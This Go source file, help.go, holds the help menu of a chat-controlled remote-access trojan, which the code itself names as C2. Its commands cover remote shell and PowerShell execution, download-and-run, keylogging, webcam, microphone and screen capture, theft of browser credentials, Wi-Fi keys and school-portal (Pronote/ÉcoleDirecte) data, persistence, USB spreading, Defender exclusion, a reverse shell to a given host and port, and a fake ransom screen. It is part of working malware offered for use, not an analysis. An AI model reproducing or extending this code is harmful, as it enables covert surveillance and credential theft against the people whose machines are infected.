// help.go — aide par sections, avec un exemple pour chaque commande.
//
// Une commande sans exemple ne sert à rien : `!exec` ou `!prank wall` ne
// s'inventent pas. Chaque ligne porte donc sa syntaxe réelle.
package main

import "strings"

var helpSections = map[string]string{
	"base": "```\n" +
		"!help [section]      cette aide (base, fichiers, capture, steal, systeme, reseau, fun)\n" +
		"!diag                autotest — ex. !diag\n" +
		"!panel               tableau de bord + liens des salons\n" +
		"!status              état du payload\n" +
		"!salons              crée/vérifie les salons\n" +
		"!shell <cmd>         cmd.exe   ex. !shell ipconfig /all\n" +
		"!ps <cmd>            PowerShell ex. !ps Get-Service | Select -First 5\n" +
		"!ls [chemin]         ex. !ls C:\\Users\n" +
		"!cat <fichier>       ex. !cat C:\\Windows\\win.ini\n" +
		"!apps [filtre]       ex. !apps chrome\n" +
		"!open <cible>        ex. !open C:\\Windows  |  !open https://google.fr\n" +
		"!close <pid|nom>     ex. !close notepad\n" +
		"!kill <pid|nom>      ex. !kill 4321  |  !kill chrome\n" +
		"!rm <chemin>         ex. !rm C:\\Users\\moi\\Desktop\\vieux.txt\n" +
		"!menu                republie le bandeau à réactions\n" +
		"```",

	"fichiers": "```\n" +
		"!download <cible>    ex. !download C:\\Users\\moi\\Documents\n" +
		"!upload <url> <dest> ex. !upload https://site/f.zip C:\\Users\\moi\\f.zip\n" +
		"!exec <fichier> [args]\n" +
		"                     ex. !exec C:\\Windows\\System32\\notepad.exe\n" +
		"                     ex. !exec C:\\Temp\\setup.exe /S /D=C:\\App\n" +
		"                     ex. !exec C:\\Temp\\script.bat\n" +
		"!files               extraction massive (évaluations et PDF d'abord)\n" +
		"!search <motif> [n]  ex. !search eval   |  !search brevet 20\n" +
		"!images              toutes les images du poste\n" +
		"!exec + fichier joint  telecharge et execute (bat, exe, ps1, vbs)\n" +
		"!new  + exe joint      met a jour le payload et relance la version\n" +
		"!update + exe joint    identique a !new (mise a jour)\n" +
		"```",

	"capture": "```\n" +
		"!screenshot          capture immédiate ici\n" +
		"!screenshot hd       agrandissement x3\n" +
		"!screenshot scale 1  échelle native\n" +
		"!screenshot 60 0 10  toutes les 60 s, écran 0, 10 fois\n" +
		"!webcam              photo\n" +
		"!webcamrec 10        vidéo AVI de 10 s\n" +
		"!mic 15              audio du micro, 15 s\n" +
		"!keylog              journal complet\n" +
		"!keylog off          coupe le flux temps réel\n" +
		"!clip                presse-papiers\n" +
		"```",

	"steal": "```\n" +
		"!steal               extraction complète vers -steal\n" +
		"!stealf              ferme les navigateurs puis extraction complète\n" +
		"!ecole               Pronote / ÉcoleDirecte + documents scolaires\n" +
		"!wifi                profils WiFi et clés en clair\n" +
		"!licence             clés d'activation Windows\n" +
		"!localisation        position + adresse\n" +
		"!sysinfo             matériel, réseau, navigateurs\n" +
		"```",

	"systeme": "```\n" +
		"!persist on          démarrage avec Windows   (!persist off pour retirer)\n" +
		"!spread              duplique l'exe sur le poste et les clés USB\n" +
		"!defender            état Defender  |  !defender exclude (admin)\n" +
		"!elevate <cmd>       ex. !elevate Get-Service\n" +
		"!power sleep         veille\n" +
		"!power lock          verrouille la session\n" +
		"!power logoff        déconnexion\n" +
		"!power off           extinction (15 s)\n" +
		"!power restart       redémarrage (15 s)\n" +
		"!shutdown            extinction immédiate\n" +
		"!shutdown r 30       redémarrage dans 30 s\n" +
		"!shutdown abort      annule un arrêt programmé\n" +
		"!killall confirm     ferme tous les processus sauf le payload\n" +
		"!delete confirm      SUPPRESSION TOTALE du payload\n" +
		"```",

	"reseau": "```\n" +
		"!shell_tcp <h> <p>   ex. !shell_tcp 1.2.3.4 4444\n" +
		"```",

	"fun": "```\n" +
		"!prank msg Coucou            boîte de dialogue\n" +
		"!prank wall C:\\img.jpg      fond d'écran (chemin ou URL)\n" +
		"!prank wall https://x/y.jpg  idem depuis internet\n" +
		"!prank url https://x.fr      ouvre une page\n" +
		"!prank speak Bonjour         synthèse vocale\n" +
		"!prank beep 5                5 bips\n" +
		"!prank cd                    ouvre le lecteur\n" +
		"!prank rotate 90             tourne l'écran (0 = normal)\n" +
		"!prank taskbar               masque la barre des tâches\n" +
		"!prank volume 10             monte le son\n" +
		"!prank mute                  coupe le son\n" +
		"!prank lock                  verrouille la session\n" +
		"!prank swapmouse             inverse les boutons de souris\n" +
		"!prank bsod                  faux écran bleu\n" +
		"!prank ransom                faux écran de rançon\n" +
		"!prank jiggle                agite la souris\n" +
		"!prank keyboard              bloque clavier et souris 10 s\n" +
		"!prank flood 20 Bonjour      ouvre 20 consoles avec le texte\n" +
		"!prank terminals 10          consoles qui se relancent en boucle\n" +
		"!prank vsbm 8               ouvre 8 onglets 3D (fait ramer le GPU)\n" +
		"!prank revert                remet barre des taches, souris, consoles\n" +
		"!prank stop                  ferme les consoles du prank\n" +
		"```",
}

const helpIndex = "**Commandes** — `!help <section>`\n" +
	"```\n" +
	"base       shell, ps, ls, cat, apps, open, kill, panel, diag, status, salons\n" +
	"fichiers   download, upload, exec, files, search, images\n" +
	"capture    screenshot, webcam, webcamrec, mic, keylog, clip\n" +
	"steal      steal, stealf, ecole, wifi, licence, localisation, sysinfo\n" +
	"systeme    persist, spread, defender, elevate, power, shutdown, killall, delete\n" +
	"reseau     shell_tcp\n" +
	"fun        prank (21 effets)\n" +
	"```\n" +
	"Chaque commande a un exemple : `!help fichiers`, `!help fun`…"

// c2HelpSection rend l'aide demandée.
func c2HelpSection(section string) string {
	s := strings.ToLower(strings.TrimSpace(section))
	s = strings.TrimPrefix(s, "!")
	if s == "" || s == "help" {
		return helpIndex
	}
	titles := map[string]string{
		"base": "Commandes de base", "fichiers": "Fichiers", "capture": "Captures et médias",
		"steal": "Extraction", "systeme": "Système", "reseau": "Réseau", "fun": "Blagues",
	}
	if txt, ok := helpSections[s]; ok {
		title := titles[s]
		if title == "" {
			title = s
		}
		return "**" + title + "**\n" + txt
	}
	return "section inconnue : `" + s + "`\n" + helpIndex
}
